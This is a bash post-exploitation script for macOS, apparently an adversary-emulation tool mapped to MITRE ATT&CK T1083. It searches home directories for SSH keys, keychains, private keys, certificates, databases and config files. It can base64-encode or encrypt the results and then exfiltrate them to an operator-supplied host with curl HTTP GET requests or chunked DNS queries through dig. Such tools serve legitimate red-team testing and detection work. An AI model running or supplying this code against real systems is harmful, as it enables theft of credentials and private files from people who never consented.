#!/bin/bash

# Script Name: file_directory.sh
# MITRE ATT&CK Technique: T1083 - File and Directory Discovery
# Tactic: Discovery
# Platform: macOS

# Author: @darmado x.com/darmad0
# Date: $(date +%Y-%m-%d)
# Version: 1.0

# Description:
# This script performs file and directory discovery on macOS systems using native commands.
# It can enumerate files and directories, search for specific file types, and identify
# sensitive files and directories commonly targeted during post-exploitation.

# References:
# - https://attack.mitre.org/techniques/T1083/
# - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1083/T1083.md

# Global Variables
NAME="file_directory"
TACTIC="discovery"
TTP_ID="T1083"
LOG_FILE="${TTP_ID}_${NAME}.log"
VERBOSE=false
LOG_ENABLED=false
ENCODE="none"
EXFIL=false
EXFIL_METHOD=""
EXFIL_URI=""
ENCRYPT="none"
ENCRYPT_KEY=""
ALL=false
CHUNK_SIZE=1000

# Command Variables
CMD_LS="ls -la"
CMD_FIND="find"
CMD_MDFIND="mdfind"
CMD_FILE="file"
CMD_DU="du -h"

# Display help message
display_help() {
    cat << 'EOF'
Usage: $0 [OPTIONS]

Description:
  Performs file and directory discovery on macOS systems using native commands.

Options:
  General:
    --help                 Show this help message
    --verbose             Enable detailed output
    --log                 Log output to file (rotates at 5MB)
    --all                 Run all checks

  Discovery Options:
    --home               Enumerate user home directory
    --sensitive          Search for sensitive files (ssh keys, config files, etc.)
    --recent=N          List recently modified files (N days)
    --size=N            Find files larger than N (in MB)
    --type=TYPE         Search for specific file types (doc,pdf,key,etc)
    --path=PATH         Specify custom path to search
    --depth=N           Maximum directory depth to search
    --hidden            Include hidden files and directories
    --symlinks          Follow symbolic links
    --perms=PERM        Find files with specific permissions (e.g., 777)

  Output Processing:
    --encode=TYPE        Encode output (b64|hex)
    --encrypt=METHOD     Encrypt output using openssl (generates random key)
    --exfil=URI         Exfiltrate output to URI using HTTP GET
    --exfil=dns=DOMAIN  Exfiltrate output via DNS queries to DOMAIN
    --chunksize=N       Size of exfiltration chunks (default: 1000)

Examples:
  $0 --all                           # Run all discovery methods
  $0 --home --sensitive              # Search for sensitive files in home dir
  $0 --type=pdf --recent=7           # Find PDFs modified in last 7 days
  $0 --path=/etc --depth=2           # Search /etc directory up to 2 levels deep
EOF
}

# Function to create log file
create_log() {
    if [ ! -f "$LOG_FILE" ]; then
        touch "$LOG_FILE"
        chmod 600 "$LOG_FILE"
    fi
}

# Function to log output
log_output() {
    local output="$1"
    local max_size=$((5 * 1024 * 1024))  # 5MB in bytes
    
    if [ ! -f "$LOG_FILE" ] || [ $(stat -f%z "$LOG_FILE") -ge $max_size ]; then
        create_log
    fi
    
    echo "$output" >> "$LOG_FILE"
    
    # Rotate log if it exceeds 5MB
    if [ $(stat -f%z "$LOG_FILE") -ge $max_size ]; then
        mv "$LOG_FILE" "${LOG_FILE}.old"
        create_log
    fi
}

# Function to encode output
encode_output() {
    local data="$1"
    local method="$2"
    
    case "$method" in
        b64)
            echo "$data" | base64
            ;;
        hex)
            echo "$data" | xxd -p
            ;;
        *)
            echo "$data"
            ;;
    esac
}

# Function to encrypt output
encrypt_output() {
    local data="$1"
    local method="$2"
    local key="$3"
    
    case "$method" in
        aes)
            echo "$data" | openssl enc -aes-256-cbc -pbkdf2 -a -A -salt -pass pass:"$key"
            ;;
        *)
            echo "Unsupported encryption method: $method" >&2
            return 1
            ;;
    esac
}

# Standard exfiltration functions
exfiltrate_http() {
    local data="$1"
    local uri="$2"
    
    if [ -z "$data" ] || [ -z "$uri" ]; then
        echo "Error: Missing data or URI for HTTP exfiltration" >&2
        return 1
    fi
    
    local encoded_data=$(echo "$data" | base64)
    curl -s "$uri?data=$encoded_data" > /dev/null 2>&1
}

exfiltrate_dns() {
    local data="$1"
    local domain="$2"
    local chunk_size="${3:-63}"  # Default to 63 (max DNS label length)
    
    if [ -z "$data" ] || [ -z "$domain" ]; then
        echo "Error: Missing data or domain for DNS exfiltration" >&2
        return 1
    fi
    
    local encoded_data=$(echo "$data" | base64 | tr '+/' '-_' | tr -d '=')
    local i=0
    
    while [ -n "$encoded_data" ]; do
        chunk="${encoded_data:0:$chunk_size}"
        encoded_data="${encoded_data:$chunk_size}"
        dig +short "${chunk}.${i}.$domain" A > /dev/null 2>&1
        i=$((i+1))
    done
}

# Function to discover files in home directory
discover_home_files() {
    local output=""
    output+="[$(date '+%Y-%m-%d %H:%M:%S')] Enumerating home directory:\n"
    output+="$($CMD_LS $HOME)\n"
    output+="[$(date '+%Y-%m-%d %H:%M:%S')] Common user directories:\n"
    output+="$($CMD_LS $HOME/Documents 2>/dev/null)\n"
    output+="$($CMD_LS $HOME/Downloads 2>/dev/null)\n"
    output+="$($CMD_LS $HOME/Desktop 2>/dev/null)\n"
    echo -e "$output"
}

# Function to discover sensitive files
discover_sensitive_files() {
    local output=""
    output+="[$(date '+%Y-%m-%d %H:%M:%S')] Searching for sensitive files:\n"
    
    # SSH Keys
    output+="SSH Keys:\n"
    output+="$($CMD_FIND $HOME/.ssh -type f 2>/dev/null)\n"
    
    # Configuration files
    output+="Configuration files:\n"
    output+="$($CMD_FIND $HOME -name "*.conf" -o -name "*.config" -o -name "*.plist" 2>/dev/null)\n"
    
    # Database files
    output+="Database files:\n"
    output+="$($CMD_FIND $HOME -name "*.db" -o -name "*.sqlite" -o -name "*.sqlite3" 2>/dev/null)\n"
    
    # Credential files
    output+="Potential credential files:\n"
    output+="$($CMD_FIND $HOME -name "*.keychain" -o -name "*.key" -o -name "*.crt" -o -name "*.cer" 2>/dev/null)\n"
    
    echo -e "$output"
}

# Function to find recently modified files
discover_recent_files() {
    local days="$1"
    local output=""
    output+="[$(date '+%Y-%m-%d %H:%M:%S')] Finding files modified in last $days days:\n"
    output+="$($CMD_FIND $HOME -type f -mtime -${days} 2>/dev/null)\n"
    echo -e "$output"
}

# Function to find files by size
discover_files_by_size() {
    local size="$1"
    local output=""
    output+="[$(date '+%Y-%m-%d %H:%M:%S')] Finding files larger than ${size}MB:\n"
    output+="$($CMD_FIND $HOME -type f -size +${size}M -exec $CMD_LS -lh {} \; 2>/dev/null)\n"
    echo -e "$output"
}

# Function to find files by type
discover_files_by_type() {
    local type="$1"
    local output=""
    output+="[$(date '+%Y-%m-%d %H:%M:%S')] Finding files of type $type:\n"
    
    case "$type" in
        doc)
            output+="$($CMD_FIND $HOME -type f \( -name "*.doc" -o -name "*.docx" -o -name "*.pages" \) 2>/dev/null)\n"
            ;;
        pdf)
            output+="$($CMD_FIND $HOME -type f -name "*.pdf" 2>/dev/null)\n"
            ;;
        key)
            output+="$($CMD_FIND $HOME -type f \( -name "*.key" -o -name "*.pem" -o -name "*.cer" -o -name "*.p12" \) 2>/dev/null)\n"
            ;;
        *)
            output+="$($CMD_FIND $HOME -type f -name "*.$type" 2>/dev/null)\n"
            ;;
    esac
    
    echo -e "$output"
}

# Function to discover files in custom path
discover_path_files() {
    local path="$1"
    local depth="$2"
    local output=""
    output+="[$(date '+%Y-%m-%d %H:%M:%S')] Enumerating path: $path (depth: $depth)\n"
    if [ -n "$depth" ]; then
        output+="$($CMD_FIND "$path" -maxdepth "$depth" -ls 2>/dev/null)\n"
    else
        output+="$($CMD_LS "$path" 2>/dev/null)\n"
    fi
    echo -e "$output"
}

# Function to discover files by permissions
discover_files_by_perms() {
    local perms="$1"
    local output=""
    output+="[$(date '+%Y-%m-%d %H:%M:%S')] Finding files with permissions $perms:\n"
    output+="$($CMD_FIND $HOME -type f -perm $perms 2>/dev/null)\n"
    echo -e "$output"
}

# Main function
main() {
    local output=""
    
    # Process command line arguments
    while [ "$#" -gt 0 ]; do
        case "$1" in
            --help)
                display_help
                exit 0
                ;;
            --verbose)
                VERBOSE=true
                ;;
            --log)
                LOG_ENABLED=true
                ;;
            --all)
                ALL=true
                ;;
            --home)
                output+="$(discover_home_files)\n"
                ;;
            --sensitive)
                output+="$(discover_sensitive_files)\n"
                ;;
            --recent=*)
                days="${1#*=}"
                output+="$(discover_recent_files "$days")\n"
                ;;
            --size=*)
                size="${1#*=}"
                output+="$(discover_files_by_size "$size")\n"
                ;;
            --type=*)
                type="${1#*=}"
                output+="$(discover_files_by_type "$type")\n"
                ;;
            --path=*)
                path="${1#*=}"
                output+="$(discover_path_files "$path" "$depth")\n"
                ;;
            --depth=*)
                depth="${1#*=}"
                ;;
            --perms=*)
                perms="${1#*=}"
                output+="$(discover_files_by_perms "$perms")\n"
                ;;
            --encode=*)
                ENCODE="${1#*=}"
                ;;
            --encrypt=*)
                ENCRYPT="${1#*=}"
                ENCRYPT_KEY=$(openssl rand -hex 32)
                ;;
            --exfil=*)
                EXFIL=true
                EXFIL_METHOD="${1#*=}"
                if [[ "$EXFIL_METHOD" == dns=* ]]; then
                    EXFIL_METHOD="dns"
                    EXFIL_URI="${1#*=dns=}"
                else
                    EXFIL_METHOD="http"
                    EXFIL_URI="${1#*=}"
                fi
                ;;
            --chunksize=*)
                CHUNK_SIZE="${1#*=}"
                ;;
            *)
                echo "Invalid option: $1" >&2
                display_help
                exit 1
                ;;
        esac
        shift
    done
    
    # If no specific options provided, run all checks
    if [ "$ALL" = true ]; then
        output+="$(discover_home_files)\n"
        output+="$(discover_sensitive_files)\n"
        output+="$(discover_recent_files 7)\n"
        output+="$(discover_files_by_size 100)\n"
        output+="$(discover_files_by_type "key")\n"
    fi
    
    # Process output based on options
    if [ "$ENCODE" != "none" ]; then
        output=$(encode_output "$output" "$ENCODE")
    fi
    
    if [ "$ENCRYPT" != "none" ]; then
        output=$(encrypt_output "$output" "$ENCRYPT" "$ENCRYPT_KEY")
        echo "Encryption key: $ENCRYPT_KEY"
    fi
    
    if [ "$EXFIL" = true ]; then
        if [ "$EXFIL_METHOD" = "dns" ]; then
            exfiltrate_dns "$output" "$EXFIL_URI" "$CHUNK_SIZE"
        else
            exfiltrate_http "$output" "$EXFIL_URI"
        fi
    else
        if [ "$LOG_ENABLED" = true ]; then
            log_output "$output"
        else
            echo -e "$output"
        fi
    fi
}

# Execute main function with all arguments
main "$@" 